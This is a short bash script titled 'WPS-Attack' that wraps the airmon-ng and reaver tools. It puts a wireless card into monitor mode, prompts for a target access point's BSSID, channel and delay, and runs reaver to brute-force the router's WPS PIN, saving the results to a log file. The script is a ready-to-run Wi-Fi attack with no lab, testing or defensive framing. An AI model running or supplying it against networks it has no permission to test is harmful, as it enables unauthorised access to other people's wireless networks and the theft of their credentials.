#! /bin/bash
# WPS-Attack

echo Starting WPS Attack...
echo What is the name of the wireless interface wlan0, wlan1 etc 
read -p 'Interface: ' invar
airmon-ng stop $invar
airmon-ng check kill
airmon-ng start $invar
airmon-ng check kill ${invar}mon
echo Enter target WiFi AP:
read -p 'WiFi AP: ' bssidvar
echo Enter Channel
read -p 'Channel: ' chanvar
echo How long to delay in seconds before each attempt
read -p 'Delay: ' delvar
echo Enter filename
read -p 'Filename: ' filevar
reaver -i ${invar}mon -b $bssidvar -vv -S -P -c $chanvar -d $delvar -o /root/wpslog/wpscrack/$filevar.log 
echo Now stopping WPS attack...
